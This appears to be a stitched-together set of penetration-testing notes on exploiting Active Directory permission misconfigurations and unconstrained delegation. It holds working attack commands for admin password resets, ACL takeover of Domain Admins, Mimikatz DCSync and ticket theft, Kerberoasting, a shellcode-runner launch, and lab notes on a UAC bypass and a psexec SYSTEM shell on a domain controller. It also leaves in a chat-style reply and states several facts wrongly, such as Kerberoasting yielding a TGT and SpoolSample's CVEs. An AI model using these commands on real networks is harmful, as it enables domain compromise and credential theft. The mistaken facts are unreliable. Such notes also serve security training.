
### **Active Directory Object Permission Theory & Exploitation Tutorial**

Active Directory (AD) is a critical component of many enterprise environments, providing authentication, authorization, and identity management services. Object permissions in AD dictate which users or groups can perform certain actions on AD objects, such as user accounts, groups, or organizational units (OUs). Misconfigurations in AD object permissions can lead to serious security risks and allow attackers to exploit these weaknesses for privilege escalation, lateral movement, or even domain dominance.

In this tutorial, we will explain the theory behind AD object permissions, identify common misconfigurations, and show how these can be exploited. We'll also provide a **table** summarizing misconfigurations, their potential exploits, and the corresponding commands for exploitation.

---

### **1. Understanding Active Directory Object Permissions**

Active Directory objects (e.g., users, computers, groups, OUs) have associated **Access Control Lists (ACLs)**, which define which users or groups have certain rights over an object. Each entry in an ACL is known as an **Access Control Entry (ACE)**, and it defines permissions like reading, writing, modifying, or deleting an object.

Common AD object permissions:
- **Read**: The ability to view the object’s properties.
- **Write**: The ability to modify the object’s properties.
- **Create/Delete**: The ability to create or delete the object.
- **WriteOwner**: The ability to change the object’s owner.
- **WriteDACL**: The ability to modify the object’s ACL.
- **GenericAll**: Full control over the object, including read, write, and delete permissions.

### **2. Exploiting AD Object Permission Misconfigurations**

Misconfigured permissions can allow attackers to:
- **Take ownership** of objects.
- **Escalate privileges** by modifying user/group memberships or changing passwords.
- **Perform lateral movement** by obtaining access to other accounts or machines.
- **Gain domain dominance** by controlling high-privileged objects.

---

### **3. Table of Misconfigurations and Exploitation**

| **Misconfiguration**                             | **Description**                                                                                   | **Exploitation**                                                                 | **Commands for Exploitation**                                                                                         |
|--------------------------------------------------|---------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Write Permissions on User Object**             | A low-privileged user has `Write` permissions on a target user object.                             | Modify attributes like `userPassword`, `servicePrincipalName (SPN)`, or `logonHours`. | `Set-ADUser` in PowerShell or `ldapmodify` in Linux.                                                                  |
| **WriteDACL on High-Privileged Object**          | A user can modify the DACL of a sensitive object (e.g., Domain Admin user/group).                  | Modify the ACL to grant themselves full control (GenericAll).                     | `Set-Acl` in PowerShell or `Add-DomainObjectAcl` with PowerView.                                                      |
| **GenericAll on User Object**                    | Full control over the user object (e.g., password reset, group membership changes).                | Reset the target user’s password and impersonate them (e.g., Domain Admin account). | `Set-ADAccountPassword` or `Invoke-ACLScanner` with PowerView.                                                        |
| **WriteOwner on User/Group Object**              | Ability to change ownership of a privileged user or group.                                         | Change the owner to the attacker, and modify permissions or reset passwords.      | `Set-Acl` to change owner in PowerShell, or `Add-DomainObjectAcl` with PowerView.                                      |
| **Write Property (User/Group Membership)**       | A user has the ability to modify group memberships for a privileged group (e.g., Domain Admins).   | Add themselves to the group and escalate privileges to Domain Admin.              | `Add-ADGroupMember` in PowerShell or `Add-DomainGroupMember` with PowerView.                                          |
| **AllExtendedRights on User Object**             | Grants the ability to perform privileged actions like password resets and replication.             | Reset passwords of privileged users or request replication data.                  | `Set-ADAccountPassword` or `DCSync` attack with tools like `Mimikatz`.                                                |
| **GenericWrite on Computer Object**              | Allows modification of properties like `servicePrincipalName (SPN)` on computer objects.           | Create a new SPN and request a TGT, which can be cracked offline (`Kerberoasting`). | `Set-ADComputer` to modify SPNs, then use `GetUserSPNs.py` from Impacket or `Invoke-Kerberoast` from PowerView.        |
| **DS-Replication-Get-Changes-All (DCSync)**      | Ability to replicate AD data (usually only granted to Domain Admins or Domain Controllers).        | Perform a DCSync attack to dump password hashes of any AD user, including Domain Admins. | `Invoke-Mimikatz -Command "lsadump::dcsync"` or use `Get-ADReplAccount` from `PowerView`.                             |
| **Write Permissions on GPO Object**              | Allows a user to modify or create Group Policy Objects (GPOs).                                     | Modify GPOs to add malicious scripts or policies for privilege escalation.        | `Set-GPRegistryValue` in PowerShell, or `Invoke-GPOAbuse` from `PowerSploit`.                                         |
| **AllowedToAct Permissions on Computer Object**  | Allows a user to register a machine to act on behalf of another using unconstrained delegation.    | Register a new machine with an SPN and perform a Pass-the-Ticket or similar attack. | Use `Add-ADComputerServiceAccount` or `Set-ADComputer` in PowerShell.                                                 |
| **UserAccountControl with `TRUSTED_FOR_DELEGATION`** | The `UserAccountControl` attribute allows delegation configuration on accounts.                   | Abuse delegation to impersonate users by intercepting their Kerberos tickets.     | Use `Set-ADUser -TrustedForDelegation` or `Set-DomainObjectProperty` with PowerView.                                   |
| **Unconstrained Delegation on Sensitive Accounts** | If an account is set for unconstrained delegation, attackers can impersonate this account.         | Steal session tokens or TGTs for high-privileged accounts and use them for lateral movement. | Use `Mimikatz` to extract Kerberos tickets from the machine's memory and impersonate the user.                         |

---

### **4. Exploiting Common AD Permission Misconfigurations**

Let’s break down some of the most common AD permission misconfigurations and their exploitation methods.

#### **a) Write Permissions on User Objects**

- **Misconfiguration**: A low-privileged user has `Write` permissions on a sensitive user account (e.g., `Domain Admin` account).
- **Exploitation**: With write access, an attacker can modify the `userPassword` attribute, change the account password, and log in as the target user.

**Command for exploitation**:
```powershell
# Modify the password of the target user
Set-ADAccountPassword -Identity "target_user" -NewPassword (ConvertTo-SecureString "NewPassword123" -AsPlainText -Force)
```

#### **b) WriteDACL Permissions on Domain Admin Group**

- **Misconfiguration**: A user has `WriteDACL` permissions on the `Domain Admins` group.
- **Exploitation**: The attacker can modify the ACL of the `Domain Admins` group and give themselves `GenericAll` access, effectively becoming a Domain Admin.

**Command for exploitation**:
```powershell
# Add the attacker to the Domain Admins group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "attacker_user" -Rights All -Verbose
```

#### **c) DCSync Permissions**

- **Misconfiguration**: The `DS-Replication-Get-Changes-All` permission allows a user to perform replication of AD data.
- **Exploitation**: The attacker can perform a **DCSync attack**, which allows them to request replication of password hashes for any user, including Domain Admins.

**Command for exploitation**:
```powershell
Invoke-Mimikatz -Command "lsadump::dcsync /domain:yourdomain.com /user:DomainAdmin"
```

#### **d) GenericWrite on Computer Objects (SPN Abuse)**

- **Misconfiguration**: An attacker has `GenericWrite` access on a computer object.
- **Exploitation**: The attacker can modify the `servicePrincipalName (SPN)` attribute and perform a **Kerberoasting** attack to request a service ticket that can be cracked offline to obtain the password hash of a service account.

**Command for exploitation**:
```powershell
# Modify SPN to include a custom SPN
Set-ADComputer -Identity "target_computer" -Add @{servicePrincipalName="fakeSPN"}

# Perform Kerberoasting attack to obtain TGT
GetUserSPNs.py yourdomain/attacker_user -request
```

### **5. Securing AD Object Permissions**

To prevent exploitation through misconfigurations in AD object permissions:
- **Audit permissions regularly**: Use tools like BloodHound to visualize and analyze AD object permissions and identify risky configurations.
- **Use least privilege principles**: Only grant users and groups the permissions they need and nothing more.
- **Monitor sensitive permissions**: Ensure that sensitive objects, such as Domain Admins, are strictly controlled, and only privileged accounts have access to modify their properties or ACLs.
- **Set up alerts**: Use monitoring tools to detect changes to critical ACLs, password resets, and suspicious group membership modifications.

---

## SDDL 

**Security Descriptor Definition Language (SDDL)** is a language used to define the security descriptors for objects in Windows, including **Active Directory (AD)** objects. It is primarily used to define **Access Control Lists (ACLs)**, which specify who has what type of access to a resource.

In the context of **Active Directory**, SDDL is used to define permissions on objects such as users, groups, organizational units (OUs), and other directory objects. Understanding SDDL is important for managing and auditing permissions within AD environments.

### **Components of SDDL**

An SDDL string has four main components:

1. **Owner (O)**: Defines the owner of the object.
2. **Primary Group (G)**: Defines the primary group for the object.
3. **Discretionary Access Control List (DACL or D)**: Specifies permissions granted or denied to users and groups.
4. **System Access Control List (SACL or S)**: Specifies audit settings for the object.

### **Basic Structure of SDDL**

An SDDL string has the following general format:

```
O:<Owner>G:<Primary Group>D:<DACL>S:<SACL>
```

Each component (`O`, `G`, `D`, `S`) may or may not be present. The most critical part is the **DACL** (D) as it defines the actual permissions.

### **Understanding DACL Entries**

The **Discretionary Access Control List (DACL)** defines access rights. It consists of one or more **Access Control Entries (ACEs)**. Each ACE in SDDL has the following structure:

```
ACE = (AceType;AceFlags;Rights;ObjectGuid;InheritedObjectGuid;AccountSid)
```

1. **AceType**: Specifies whether the ACE is allowing or denying permissions (e.g., `A` for Allow, `D` for Deny).
2. **AceFlags**: Defines inheritance and audit flags (e.g., `OI` for Object Inherit, `CI` for Container Inherit).
3. **Rights**: The permissions or rights being granted or denied (e.g., `CC` for Create Child, `DC` for Delete Child).
4. **ObjectGuid**: Optional field that identifies the type of object the permission applies to.
5. **InheritedObjectGuid**: Optional field that defines inheritance for child objects.
6. **AccountSid**: The security identifier (SID) of the user, group, or service to which the ACE applies (e.g., `S-1-5-32-544` for the Administrators group).

### **Example of an SDDL String**

Let’s break down a sample SDDL string for an AD object:

```
O:SYG:SYD:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;SY)
```

- **O:SY**: The owner of the object is **SY** (System).
- **G:SY**: The primary group for the object is **SY** (System).
- **D:**:
  - `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;SY)`: This is an ACE that:
    - **A**: Allows the permission.
    - **RPWPCRCCDCLCLORCWOWDSDDTSW**: A series of access rights, including:
      - `RP` (Read Property)
      - `WP` (Write Property)
      - `CC` (Create Child)
      - `DC` (Delete Child)
      - `LC` (List Contents)
      - `SW` (Self Write)
    - **SY**: The System account is being granted these rights.

### **Common ACE Permissions**

Here are some common permission abbreviations seen in SDDL strings for AD objects:

- **RP**: Read Property
- **WP**: Write Property
- **CC**: Create Child
- **DC**: Delete Child
- **LC**: List Contents
- **SW**: Self Write
- **GA**: Generic All
- **GR**: Generic Read
- **GW**: Generic Write
- **GX**: Generic Execute

### **Common ACE Types**

- **A**: Allow
- **D**: Deny

### **AceFlags (Inheritance)**

- **CI**: Container Inherit
- **OI**: Object Inherit
- **NP**: No Propagate Inherit
- **IO**: Inherit Only

### **Example of a Detailed SDDL Breakdown**

```
D:(A;;RPWP;S-1-5-21-...;WD)
```

- **D**: This is a DACL entry.
- **A**: Allow entry.
- **RPWP**: Grants **Read Property** and **Write Property** permissions.
- **S-1-5-21-...**: The **SID** for the security principal (a user or group).
- **WD**: The **Well-known SID** for **Everyone**.

### **Modifying Permissions Using SDDL**

You can use tools like **PowerShell** or **dsacls** to modify permissions via SDDL in AD. Here’s how:

#### **Using PowerShell to Read/Modify SDDL**

You can retrieve the SDDL of an AD object using PowerShell's `Get-Acl` cmdlet.

```powershell
# Get SDDL of an AD object
$acl = Get-Acl "AD:CN=TestUser,OU=Users,DC=domain,DC=com"
$acl.Sddl
```

#### **Setting Permissions Using SDDL**

To set permissions using SDDL, you can modify the security descriptor and apply it:

```powershell
# Set SDDL on an AD object
$acl.SetSecurityDescriptorSddlForm("O:SYG:SYD:(A;;RPWP;S-1-5-21-...;WD)")
Set-Acl -Path "AD:CN=TestUser,OU=Users,DC=domain,DC=com" -AclObject $acl
```

#### **Using `dsacls`**

You can use `dsacls` to view and modify SDDL permissions on AD objects.

```cmd
# View permissions
dsacls "CN=TestUser,OU=Users,DC=domain,DC=com"

# Modify permissions using SDDL
dsacls "CN=TestUser,OU=Users,DC=domain,DC=com" /S "O:SYG:SYD:(A;;RPWP;S-1-5-21-...;WD)"
```

### **Common Use Cases of SDDL in Active Directory**

1. **Auditing AD Permissions**: SDDL strings can be used to audit AD permissions to ensure that users have the appropriate level of access.
2. **Privilege Escalation**: In some attack scenarios, misconfigured SDDL permissions can be exploited by attackers to escalate privileges (e.g., by gaining write access to sensitive AD objects).
3. **Delegating AD Permissions**: Admins can delegate specific permissions to users or groups in AD by modifying SDDL strings.
4. **Auditing Access (SACL)**: SDDL is used to define what actions on an AD object should be audited by the system (successes, failures, etc.).

### **Conclusion**

Understanding SDDL is critical for managing and auditing Active Directory permissions. It gives administrators granular control over who can access or modify AD objects, as well as the ability to set auditing policies. By learning how to read and modify SDDL strings, administrators can enhance security and ensure proper access control in their Active Directory environments.

Yes, you can translate the **Access Control Entry (ACE)** string in **Security Descriptor Definition Language (SDDL)** into a more human-readable form using tools such as **PowerShell** or command-line utilities like **`dsacls`**. The ACE string is part of the **Discretionary Access Control List (DACL)** or **System Access Control List (SACL)** in SDDL, and it contains encoded permissions, which can be difficult to interpret directly.

Below, I’ll walk you through several methods to translate or decode the ACE string into a human-readable format.

---

### **1. Using PowerShell to Translate an ACE**

PowerShell provides a straightforward way to retrieve and translate ACEs from an object’s security descriptor, like an Active Directory (AD) object.

#### **Steps**:

1. **Retrieve the ACE**: Use the `Get-Acl` cmdlet to retrieve the ACL (Access Control List) of an AD object or file.
2. **Iterate Over ACEs**: Access the ACEs in the `Access` or `Audit` property of the ACL and print them in a readable form.

#### **Example: Translating ACE from an Active Directory Object**

```powershell
# Retrieve the security descriptor (ACL) of an AD object
$acl = Get-Acl "AD:CN=TestUser,OU=Users,DC=domain,DC=com"

# Print all ACEs in a human-readable format
$acl.Access | ForEach-Object {
    "Identity: " + $_.IdentityReference
    "Access Control Type: " + $_.AccessControlType
    "Active Directory Rights: " + $_.ActiveDirectoryRights
    "Inheritance: " + $_.InheritanceFlags
    "Propagation: " + $_.PropagationFlags
    "------------------------"
}
```

#### **Explanation**:
- `IdentityReference`: The user or group that the ACE applies to (represented as a SID or domain\username).
- `AccessControlType`: Whether the ACE allows (`Allow`) or denies (`Deny`) access.
- `ActiveDirectoryRights`: The permissions granted or denied (e.g., `GenericRead`, `WriteProperty`, `CreateChild`).
- `InheritanceFlags` & `PropagationFlags`: Describe how the ACE is inherited by child objects (if applicable).

### **2. Using `dsacls` Command**

The **`dsacls`** command-line tool is built into Windows and can be used to display permissions for Active Directory objects in a readable format. It parses the DACL and translates the ACEs for you.

#### **Example**:

```bash
# View permissions in a human-readable format
dsacls "CN=TestUser,OU=Users,DC=domain,DC=com"
```

#### **Explanation**:
- **`dsacls`** will list the **Allow** and **Deny** ACEs, showing:
  - The **user or group** (SID or name) to whom the ACE applies.
  - The specific **permissions** (e.g., `Read`, `Write`, `Full Control`).
  - **Inheritance** flags if applicable.

### **3. Using `sdexplorer.exe` (Security Descriptor Explorer)**

Another option is to use the **Security Descriptor Explorer (sdexplorer.exe)** tool, which provides a graphical interface for viewing and editing security descriptors. This tool makes it easier to interpret SDDL strings and ACEs.

#### **Download**:
- The tool is available from the Sysinternals suite by Microsoft.

#### **Usage**:
- After loading the security descriptor of an object (like an AD object or file), you can explore the permissions and see the ACEs decoded into human-readable form.

---

### **Manually Translating ACE Strings**

If you are interested in manually translating the ACE string, here’s how you can interpret its components:

1. **ACE Format**:
   ```
   (AceType;AceFlags;Rights;ObjectGuid;InheritedObjectGuid;AccountSid)
   ```

   Example ACE string:
   ```
   (A;;RPWPCCDCLCLORCWDWOSD;;;S-1-5-32-544)
   ```

2. **AceType (A)**: Allow (`A`) or Deny (`D`).

3. **AceFlags**:
   - **CI**: Container Inherit
   - **OI**: Object Inherit
   - **NP**: No Propagate Inherit
   - **IO**: Inherit Only

4. **Rights**: Defines the specific permissions being granted or denied:
   - **RP**: Read Property
   - **WP**: Write Property
   - **CC**: Create Child
   - **DC**: Delete Child
   - **LC**: List Contents
   - **SW**: Self Write
   - **GR**: Generic Read
   - **GW**: Generic Write
   - **GA**: Generic All

5. **AccountSid**:
   - **S-1-5-32-544**: This is the **SID** for a security principal (e.g., the Administrators group).
   - Use **PowerShell** or **`whoami /groups`** to decode the SID into the actual user or group.

#### **Manual Translation Example**:

For this ACE:
```
(A;;RPWPCCDCLCLORCWDWOSD;;;S-1-5-32-544)
```

- **AceType**: `(A)` - Allow.
- **AceFlags**: Empty, no inheritance or propagation flags.
- **Rights**: `RPWPCCDCLCLORCWDWOSD` - The rights granted are:
  - **RP**: Read Property.
  - **WP**: Write Property.
  - **CC**: Create Child.
  - **DC**: Delete Child.
  - **LC**: List Contents.
  - **SW**: Self Write.
  - **SD**: Delete.
- **AccountSid**: `S-1-5-32-544` is the **Administrators** group.

### **Conclusion**

There are several ways to translate and decode ACE strings from SDDL into a human-readable format:
1. **PowerShell** is a great option to programmatically retrieve and display the ACEs.
2. **`dsacls`** provides an easy way to quickly view AD permissions from the command line.
3. **Manual translation** is possible by breaking down the ACE components.


```powershell
 Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) ; $_} | ForEach-Object {
>>     "Identity: " + $_.IdentityReference
>>     "Access Control Type: " + $_.ActiveDirectoryRights
>>     "Inherited: " + $_.IsInherited
>>     "------------------------"
>> }
```


**PowerView Script to Enumerate Domain Users with GenericAll Permissions**
```powershell
# Ensure PowerView is imported (if you have PowerView loaded as a script)
# Import-Module PowerView.ps1

# Step 1: Enumerate all domain users
$domainUsers = Get-DomainUser

# Step 2: Loop through each user and check for GenericAll permissions
foreach ($user in $domainUsers) {
    # Get the distinguished name of the user
    $userDn = $user.distinguishedname

    # Step 3: Get ACLs for each user
    $acl = Get-ObjectAcl -DistinguishedName $userDn -ResolveGUIDs

    # Step 4: Filter for GenericAll rights
    $genericAllPermissions = $acl | Where-Object {
        $_.ActiveDirectoryRights -match "GenericAll"
    }

    # Step 5: If GenericAll permissions are found, print relevant information
    if ($genericAllPermissions) {
        $genericAllPermissions | ForEach-Object {
            "User: " + $user.sAMAccountName
            "Object DN: " + $_.ObjectDN
            "Object SID: " + $_.ObjectSID
            "Permissions: " + $_.ActiveDirectoryRights
            "Inherited: " + $_.IsInherited
            "------------------------"
        }
    }
}

```


- Run as user after hijack
```powershell
.\RunAsCs.exe <user> <password> "powershell -ExecutionPolicy ByPass c:\users\Public\Downloads\shellcode-runner.ps1" -d <domain>
```

## GenericWrite

```powershell
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
Set-DomainObject -Credential $Cred -Identity testservice1 -Set @{serviceprincipalname='foobar/xd'}
Rubeus.exe kerberoast /user:testservice1 /nowrap
```


```powershell
Import-Module PowerView.ps1

function Get-GroupsWithSpecificPermission {
    param (
        [Parameter(Mandatory = $true)]
        [string]$PermissionType,
        [Parameter(Mandatory = $false)]
        [string]$OutputFile = "GroupPermissionsOutput.txt"
    )

    # Get all domain groups
    $groups = Get-DomainGroup

    # Create an array to hold output lines
    $outputLines = @()

    foreach ($group in $groups) {
        # Get the ACLs for each group
        $acls = Get-ObjectAcl -Identity $group.DistinguishedName -ResolveGUIDs

        # Create an empty array to hold accounts with the specified permission
        $accountsWithPermission = @()

        foreach ($acl in $acls) {
            # Check if the specified permission exists in the ACL
            if ($acl.ActiveDirectoryRights -match $PermissionType) {
                # Try to resolve the PrincipalIdentity, fall back to SID if necessary
                $SID = $acl.SecurityIdentifier
                $resolvedName = try {
                    $SID.Translate([System.Security.Principal.NTAccount]).Value
                } catch {
                    "Could not resolve SID: $SID"
                }

                # Add the resolved account or SID to the list
                $accountsWithPermission += $resolvedName
            }
        }

        # If any accounts were found with the specified permission, prepare the output for that group
        if ($accountsWithPermission.Count -gt 0) {
            $groupOutput = "Group Name: $($group.Name)`r`n" +
                           "Distinguished Name: $($group.DistinguishedName)`r`n" +
                           "Permission Type: $PermissionType`r`n" +
                           "Accounts: $($accountsWithPermission -join ', ')`r`n"

            # Add the formatted output for this group to the array
            $outputLines += $groupOutput
        }
    }

    # Save the output to the specified file
    $outputLines | Out-File -FilePath $OutputFile -Width 300
    Write-Host "Results saved to $OutputFile"
}

# Example Usage
# Get-GroupsWithSpecificPermission -PermissionType "GenericAll" -OutputFile "PermissionsReport.txt"

```


### PowerView Script for Users with Specific Permissions

```powershell
Import-Module PowerView.ps1

function Get-UsersWithSpecificPermission {
    param (
        [Parameter(Mandatory = $true)]
        [string]$PermissionType,
        [Parameter(Mandatory = $false)]
        [string]$OutputFile = "UserPermissionsOutput.txt"
    )

    # Get all domain users
    $users = Get-DomainUser

    # Create an array to hold output lines
    $outputLines = @()

    foreach ($user in $users) {
        # Get the ACLs for each user
        $acls = Get-ObjectAcl -Identity $user.DistinguishedName -ResolveGUIDs

        # Create an empty array to hold accounts with the specified permission over this user
        $accountsWithPermission = @()

        foreach ($acl in $acls) {
            # Check if the specified permission exists in the ACL
            if ($acl.ActiveDirectoryRights -match $PermissionType) {
                # Try to resolve the PrincipalIdentity, fall back to SID if necessary
                $SID = $acl.SecurityIdentifier
                $resolvedName = try {
                    $SID.Translate([System.Security.Principal.NTAccount]).Value
                } catch {
                    "Could not resolve SID: $SID"
                }

                # Add the resolved account or SID to the list
                $accountsWithPermission += $resolvedName
            }
        }

        # If any accounts were found with the specified permission, prepare the output for that user
        if ($accountsWithPermission.Count -gt 0) {
            $userOutput = "User Name: $($user.Name)`r`n" +
                          "Distinguished Name: $($user.DistinguishedName)`r`n" +
                          "Permission Type: $PermissionType`r`n" +
                          "Accounts: $($accountsWithPermission -join ', ')`r`n"

            # Add the formatted output for this user to the array
            $outputLines += $userOutput
        }
    }

    # Save the output to the specified file
    $outputLines | Out-File -FilePath $OutputFile -Width 300
    Write-Host "Results saved to $OutputFile"
}

# Example Usage
# Get-UsersWithSpecificPermission -PermissionType "GenericAll" -OutputFile "UserPermissionsReport.txt"

```

### PowerView Script for Enumerating Users with Permissions over Other User Accounts:

```powershell
Import-Module PowerView.ps1

function Get-UsersWithPermissionsOverOtherUsers {
    param (
        [Parameter(Mandatory = $true)]
        [string]$PermissionType,
        [Parameter(Mandatory = $false)]
        [string]$OutputFile = "UserToUserPermissionsOutput.txt"
    )

    # Get all domain users
    $targetUsers = Get-DomainUser

    # Create an array to hold output lines
    $outputLines = @()

    foreach ($targetUser in $targetUsers) {
        # Get the ACLs for each target user
        $acls = Get-ObjectAcl -Identity $targetUser.DistinguishedName -ResolveGUIDs

        # Create an empty array to hold accounts with the specified permission over this user
        $accountsWithPermission = @()

        foreach ($acl in $acls) {
            # Check if the specified permission exists in the ACL
            if ($acl.ActiveDirectoryRights -match $PermissionType) {
                # Try to resolve the PrincipalIdentity, fall back to SID if necessary
                $SID = $acl.SecurityIdentifier
                $resolvedName = try {
                    $SID.Translate([System.Security.Principal.NTAccount]).Value
                } catch {
                    "Could not resolve SID: $SID"
                }

                # Add the resolved account or SID to the list if it's a user (filter non-users)
                if ($resolvedName -notmatch 'S-1-5-') {
                    $accountsWithPermission += $resolvedName
                }
            }
        }

        # If any accounts were found with the specified permission, prepare the output for that user
        if ($accountsWithPermission.Count -gt 0) {
            $userOutput = "User Target: $($targetUser.Name)`r`n" +
                          "Distinguished Name: $($targetUser.DistinguishedName)`r`n" +
                          "Permission Type: $PermissionType`r`n" +
                          "Accounts with Permission: $($accountsWithPermission -join ', ')`r`n"

            # Add the formatted output for this user to the array
            $outputLines += $userOutput
        }
    }

    # Save the output to the specified file
    $outputLines | Out-File -FilePath $OutputFile -Width 300
    Write-Host "Results saved to $OutputFile"
}

# Example Usage
# Get-UsersWithPermissionsOverOtherUsers -PermissionType "WriteDACL" -OutputFile "UserToUserPermissionsReport.txt"

```

## Delegation

### Unconstrained Delegation

### **Unconstrained Delegation Tutorial**

Unconstrained delegation is a powerful and potentially dangerous feature in Active Directory (AD) environments. It allows a service running on a system to impersonate a user on any other service across the network after the user authenticates to that system. This can be exploited by attackers if not properly secured.

#### **What is Delegation?**

Delegation allows one computer or service to perform actions on behalf of a user after the user has authenticated. There are two main types of delegation:

1. **Unconstrained Delegation**: Allows a service to act as any user who authenticates to it for accessing other network services.
2. **Constrained Delegation**: Restricts which services the delegate can access on behalf of the user.

#### **Unconstrained Delegation in Kerberos**

When unconstrained delegation is enabled, any user who authenticates to the service or machine (with unconstrained delegation configured) will leave a copy of their **TGT (Ticket Granting Ticket)** on the server. This ticket allows the service to request any other Kerberos service tickets on behalf of the user.

---

### **Kerberos Flow in Unconstrained Delegation**

Here is an overview of the Kerberos authentication flow in the context of unconstrained delegation:

| Step | Kerberos Flow Stage                                             | Description                                                                                                                                         |
|------|------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| 1    | **User Authentication**                                          | User logs into the domain and obtains a **TGT** from the **KDC** (Key Distribution Center).                                                          |
| 2    | **Service Request**                                              | The user accesses a service (e.g., a web server) on a server that has unconstrained delegation enabled.                                              |
| 3    | **TGT Delegation**                                               | The user's **TGT** is forwarded to the server with unconstrained delegation. The server stores this TGT for later use.                               |
| 4    | **Requesting Service Tickets on Behalf of User**                 | The server can now request Kerberos service tickets from the **KDC** on behalf of the user using the stored **TGT**.                                 |
| 5    | **Accessing Other Services**                                     | The server uses the service tickets to impersonate the user and access other network resources (e.g., file shares, databases) without the user's knowledge. |
| 6    | **Exploitation Possibility**                                     | Attackers who gain control of the server can steal these TGTs and impersonate users across the network, potentially escalating privileges.           |

---

### **Exploitation of Unconstrained Delegation**

#### **1. Finding Systems with Unconstrained Delegation using PowerView**

You can use **PowerView** to search for computers or services configured with unconstrained delegation in an Active Directory environment.

```powershell
# List all systems with Unconstrained Delegation enabled
Get-DomainComputer -Unconstrained
```

This command will return a list of computers in the domain that have unconstrained delegation enabled. These are potential targets for further exploitation.

#### **2. Stealing Tickets from Systems with Unconstrained Delegation**

When a user authenticates to a system with unconstrained delegation, their **TGT** is stored on the system. Attackers can dump these tickets and impersonate users on other services.

##### Example Attack Scenario:
- An attacker compromises a system with unconstrained delegation (e.g., via RDP or other methods).
- The attacker extracts the **TGT** of a privileged user (e.g., a Domain Admin) from memory using tools like **Mimikatz**.
- The attacker can then use the extracted **TGT** to impersonate the user on other network services.

##### Using **Mimikatz** to Dump Kerberos Tickets:

1. Dump the Kerberos tickets from the system:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

2. Look for **TGT** tickets in the output. These tickets can be exported and used for impersonation.

##### Exporting the TGT:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

This command exports the tickets to `.kirbi` files, which can be used with tools like **Rubeus** to re-use the TGT and impersonate the user.

#### **3. Using Rubeus to Request a TGT**

Once a TGT is stolen or dumped from a system, you can use **Rubeus** to import and use it to request service tickets or even execute actions as the target user.

##### Importing and Using the TGT with Rubeus:

```powershell
Rubeus.exe asktgt /ticket:<path-to-ticket>.kirbi /service:cifs /target:<target-system>
```

This allows the attacker to request service tickets for specific services, enabling them to act as the user on another system (e.g., accessing file shares).

---

### **Preventing Unconstrained Delegation Exploits**

To prevent these kinds of attacks, you can take several precautions:

1. **Disable Unconstrained Delegation**: Constrain delegation to specific services rather than allowing unrestricted access.
   
2. **Use Windows Server 2012+ with Protected Users**: The **Protected Users** group prevents members from using delegation features.

3. **Monitor for Ticket Theft**: Use security monitoring tools to detect suspicious activity, such as dumping of tickets or impersonation attempts.

---

### **PowerUp Exploitation Method:**

In a penetration test, after identifying unconstrained delegation on a machine, an attacker can use **PowerUp** to escalate privileges. PowerUp contains several privilege escalation techniques, including searching for credentials and misconfigurations in services.

Example command to search for misconfigurations:

```powershell
Invoke-AllChecks
```

This will run various checks on the local machine, including searching for vulnerable services that could help escalate privileges.

---

### **Summary**

Unconstrained delegation can be a significant security risk if improperly configured. Attackers who compromise systems with unconstrained delegation enabled can easily escalate privileges by stealing **TGTs** from authenticated users and impersonating them across the network. Tools like **PowerView**, **Mimikatz**, and **Rubeus** make it easy for attackers to find vulnerable systems and exploit them. By limiting delegation and monitoring for misuse, administrators can reduce the risk of these attacks.

#### BloodHound Query that finds computers with Unconstrained Delegation and marks them as high value
```
MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH "516" WITH COLLECT(dc) as domainControllers MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true}) WHERE NOT c in domainControllers SET c.highvalue = true RETURN c
```


### 16.2.1.1

- sliver implant uploaded to server and executed
- needed to get high integrity shell
	- ran `execute-assembly /home/roger/Documents/Tools/SharpBypassUAC.exe -b eventvwr -e YzpcdXNlcnNcb2Zmc2VjXGRvd25sb2Fkc1x0Y3AuZXhl` to bypass UAC and get a high integrity shell
	- needed to upload JuicyPotatoNG and execute another shell to get SeDebugPriv enabled
		- Note: tried a powershell script that should enable the priv without having to have 3 shells on the machine, but that failed
- followed the course instructions (use Edge browser to get admin tgt)
- dumped tickets `sekurlsa::tickets /export`
- used PsExec to get admin shell on dc from rdp connection on other server
- alt method:
	- used .`\mimikatz "privilege::debug" "kerberos::ptt c:\tools\admin.kirbi" "lsadump::dcsync /domain:prod.corp1.com "exit"` to dump admin ntlm hash
	- on `kali` used `impacket-psexec` to access shell on DC
```bash
❯ impacket-psexec -dc-ip 192.168.189.70 -hashes <redacted>:<redacted>  <domain>/admin@1<ip>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on <ip>.....
[*] Found writable share ADMIN$
[*] Uploading file FHnxAWEI.exe
[*] Opening SVCManager on <ip>.....
[*] Creating service esXF on <ip>.....
[*] Starting service esXF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


**SpoolSample** exploits a vulnerability in the **Windows Print Spooler service** (CVE-2020-1048 and CVE-2020-1337) that can allow an attacker to force a Domain Controller (DC) or another target system to authenticate to an attacker's system via NTLM. This can be leveraged for **credential theft** and **privilege escalation**.

### Background of the Windows Print Spooler Service
The **Windows Print Spooler** is a service that manages print jobs sent to printers. It's available on most Windows systems, including Domain Controllers, and it's often enabled by default. The vulnerability lies in the fact that the service can be tricked into connecting to an attacker-controlled machine and leaking authentication details (NTLM hashes).

### How SpoolSample Works

1. **Print Spooler Abuses Remote Procedure Call (RPC)**:
   The Print Spooler uses **Remote Procedure Call (RPC)** to communicate with other systems and printers. SpoolSample abuses this behavior by making an RPC request to a **Domain Controller** or another target, telling it to connect to a print server.

2. **Target (DC) Connects to a Malicious SMB Server**:
